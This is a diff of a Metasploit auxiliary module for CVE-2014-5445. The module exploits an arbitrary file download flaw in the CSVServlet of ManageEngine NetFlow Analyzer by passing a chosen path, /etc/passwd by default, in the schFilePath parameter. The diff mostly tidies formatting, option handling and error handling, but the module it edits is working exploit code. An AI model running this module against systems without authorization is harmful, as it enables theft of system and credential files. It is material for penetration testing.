@@ -12,18 +12,18 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "ManageEngine NetFlow Analyzer Arbitrary File Download",
+      'Name'           => 'ManageEngine NetFlow Analyzer Arbitrary File Download',
       'Description'    => %q{
-          This module exploits an arbitrary file download vulnerability in CSVServlet
-          on ManageEngine NetFlow Analyzer.
-          This module has been tested on both Windows and Linux with versions 8.6 to 10.2.
-          Windows paths have to be escaped with 4 backslashes on the command line.
+        This module exploits an arbitrary file download vulnerability in CSVServlet
+        on ManageEngine NetFlow Analyzer. This module has been tested on both Windows
+        and Linux with versions 8.6 to 10.2. Windows paths have to be escaped with 2
+        backslashes on the command line.
       },
-      'Author'       =>
+      'Author'         =>
         [
           'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
         ],
-      'License'     => MSF_LICENSE,
+      'License'        => MSF_LICENSE,
       'References'     =>
         [
           [ 'CVE', '2014-5445' ],
@@ -38,18 +38,12 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('TARGETURI',
           [ true, "The base path to NetFlow Analyzer", '/netflow' ]),
-        OptString.new('FILEPATH', [false, 'Path of the file to download (escape Windows paths with 4 back slashes)', '/etc/passwd']),
+        OptString.new('FILEPATH', [true, 'Path of the file to download (escape Windows paths with 2 back slashes)', '/etc/passwd']),
       ], self.class)
   end
 
 
   def run
-    # No point to continue if filepath is not specified
-    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
-      print_error("Please supply the path of the file you want to download.")
-      return
-    end
-
     # Create request
     begin
       print_status("#{peer} - Downloading file #{datastore['FILEPATH']}")
@@ -58,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', 'CSVServlet'),
         'vars_get' => { 'schFilePath' => datastore['FILEPATH'] },
       })
-    rescue Rex::ConnectionRefused
+    rescue Rex::ConnectionError
       print_error("#{peer} - Could not connect.")
       return
     end
@@ -79,7 +73,7 @@ class Metasploit3 < Msf::Auxiliary
         res.body,
         fname
       )
-      print_good("File saved in: #{path}")
+      print_good("#{peer} - File saved in: #{path}")
     else
       print_error("#{peer} - Failed to download file.")
     end
